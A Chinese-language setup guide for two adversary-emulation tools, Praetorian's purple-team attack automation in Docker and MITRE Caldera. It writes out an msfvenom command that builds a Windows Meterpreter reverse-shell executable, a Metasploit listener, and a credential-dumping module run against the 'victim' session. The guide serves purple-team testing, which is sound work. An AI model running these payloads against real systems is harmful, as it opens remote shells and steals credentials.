# 威胁工具研究

## 紫色团队攻击自动化

Github：<https://github.com/praetorian-code/purple-team-attack-automation>

工具部署及安装方法：

1、kali下安装docker-compose

```bash
apt-get install docker docker-compose
```

2、下载Github文件

```bash
git clone https://github.com/praetorian-code/purple-team-attack-automation.git
```

3、编译./docker-compose.local.override.yml文件以反映您本地系统的LHOST，如下所示。默认情况下，端口4444将被转发到docker容器。如果要使用其他端口（例如，以镜像HTTPS），则必须将它们添加到此文件中。(注意此文件需要自行创建)

```yml
version: '3'
services:
  ms:
    environment:
      # example of setting LHOST
      LHOST: 10.0.8.2
    # example of adding more ports
    ports:
      - 8080:8080
      - 443:443
```

根据需要添加/删除其他端口或IP地址。不要忘记将LHOST更改为您自己的IP地址。
确保设置LHOST为可解析为主机的有效主机名。

4、设置COMPOSE_FILE环境变量

```bash
echo "COMPOSE_FILE=./docker-compose.yml:./docker-compose.override.yml:./docker-compose.local.override.yml" >> .env
```

5、建议并运行docker容器

```bash
service docker start
docker-compose build
./docker/bin/msfconsole #当前目录下执行此命令
```

**启动之后进入docker msfconsole中**a

6、生成Meterpreter有效载荷

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.130 LPORT=4444 -f exe > meterpreter.exe
```

7、启动并运行本地侦听(msf下操作)

```bash
 use exploit/multi/handler
 set Interrupt: use the 'exit' command to quit
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <Attacker IP Address>
 set LPORT 4444
 exploit -j -z
```

复制并在目标（“受害者”）主机上以管理员身份运行meterpreter.exe，然后等待会话。

8、运行相关TTP模块。面提供了模块列表。例如，要启动“凭据转储（T1003）”模块，请运行：

```bash
use modules/post/windows/purple/t1003
info
set session 1
run
```

9、其他

查看目前有哪些TID

```bash
reload_all
search purple
```

set Interrupt: use the 'exit' command to quit

学习视频：
<https://www.youtube.com/watch?v=o3Qb_0clIpg&feature=youtu.be>

## 卡尔德拉caldera

Github：<https://github.com/mitre/caldera>

1、首先以递归方式克隆此存储库，并以xxx格式传递所需的版本/发行版。这将拉出所有可用的插件。

```bash
git clone --branch x.x.x https://github.com/mitre/caldera.git --recursive
```

目前最新版本为：2.3.2

2、从该文件的根目录开始，安装PIP要求。

```bash
pip install -r requirements.txt
```

注意：由于该项目要求python3.5以上，因此在执行此命令时要注意以pip3执行

3、启动服务

```bash
python server.py
```

注意：此处也是个坑，如果你安装有多个版本python,建议指定python版本。

```bash
python3.7 server.py
```

关于使用建议参考官方
